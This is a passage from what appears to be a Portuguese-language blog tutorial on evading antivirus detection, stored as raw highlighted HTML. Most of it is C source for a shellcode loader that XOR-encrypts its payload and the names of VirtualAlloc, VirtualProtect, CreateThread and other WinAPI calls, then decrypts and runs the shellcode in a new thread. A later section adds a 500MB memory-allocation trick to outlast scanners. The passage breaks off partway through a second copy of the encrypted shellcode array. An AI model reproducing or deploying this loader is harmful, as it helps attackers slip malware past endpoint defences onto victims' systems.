class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>

<span class="c1">//ponteiro para VirtualAlloc</span>
<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVA</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
<span class="c1">//ponteiro para VirtualProtect</span>
<span class="n">BOOL</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVP</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
<span class="c1">//ponteiro para CreateThread</span>
<span class="n">HANDLE</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCT</span><span class="p">)(</span><span class="n">PSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">lpThreadId</span><span class="p">);</span>
<span class="c1">//ponteiro para WaitForSingleObject</span>
<span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pWFSO</span><span class="p">)(</span><span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwMilliseconds</span><span class="p">);</span>
<span class="c1">//ponteiro para RtlMoveMemory</span>
<span class="n">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pRM</span><span class="p">)(</span><span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> <span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="c1">// XOR encrypted da VirtualAlloc</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVA</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVALen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVA</span><span class="p">);</span>

<span class="c1">// XOR encrypted VirtualProtect</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVP</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVPLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVP</span><span class="p">);</span>

<span class="c1">//XOR encrypted da CreateThread</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cCT</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cCTLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cCT</span><span class="p">);</span>

<span class="c1">//XOR encrypted da WaitForSingleObject</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cWFSO</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cWFSOLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cWFSO</span><span class="p">);</span>

<span class="c1">//XOR encrypted da RtlMoveMemory</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cRM</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cRMLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cRM</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="c1">// deXOR da VirtualAlloc</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVA</span><span class="p">,</span> <span class="n">cVALen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
        <span class="c1">// deXOR do shellcode</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
    <span class="c1">// deXOR da VirtualProtect</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVP</span><span class="p">,</span> <span class="n">cVPLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
    <span class="c1">// deXOR da CreateThread</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cCT</span><span class="p">,</span> <span class="n">cCTLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
    <span class="c1">// deXOR da WaitForSingleObject</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cWFSO</span><span class="p">,</span> <span class="n">cWFSOLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
    <span class="c1">// deXOR da RtlMoveMemory</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cRM</span><span class="p">,</span> <span class="n">cRMLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>

    <span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVA</span><span class="p">);</span>
    <span class="n">pVP</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVP</span><span class="p">);</span>
    <span class="n">pCT</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cCT</span><span class="p">);</span>
    <span class="n">pWFSO</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cWFSO</span><span class="p">);</span>
    <span class="n">pRM</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cRM</span><span class="p">);</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">pVA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>


    <span class="n">pRM</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="n">rx</span> <span class="o">=</span> <span class="n">pVP</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="kr">thread</span> <span class="o">=</span> <span class="n">pCT</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="n">pWFSO</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Com esta implementação, quase todas as funções utilizadas no programa que foram extraídas da WinAPI não fazem mais parte da <em>import address table</em> e nem aparecem nas <em>strings</em> do programa.</p><h2 id="vencendo-pelo-tempo">Vencendo pelo tempo</h2><p>Esta implementação é a mais simples e pode não ser efetiva em muitos antivírus mais robustos, porém é uma técnica bastante utilizada que vale a pena implementar.</p><p>Uma das limitações de muitos scanners dos antivírus é o tempo que tem para realizar esta tarefa. Imagine que, quando um scan se inicia no SO, milhares de arquivos precisam ser escaneados. Isso implica no fato de que os scanners não tem muito tempo para gastar em cada arquivo, fazendo com que arquivos que consumam muita memória sejam varridos de forma mais superficial.</p><p>Neste caso, uma das técnicas mais utilizadas é justamente alocar uma grande quantidade de memória dinâmica antes de se iniciar a lógica da exploração. Por exemplo, podemos alocar na <em>heap</em> <code class="language-plaintext highlighter-rouge">500MB</code> de memória e preenchê-la com zeros:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">500000000</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="mi">500000000</span><span class="p">);</span>
	<span class="n">free</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>
	<span class="c1">// lógica da exploração</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Eu falo muito sobre a <em>heap</em> no meu <a href="https://h41stur.com/posts/paper-heap/"><em>Paper Heap Exploitation</em></a>.</p><p>Com esta implementação, o código final fica da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span 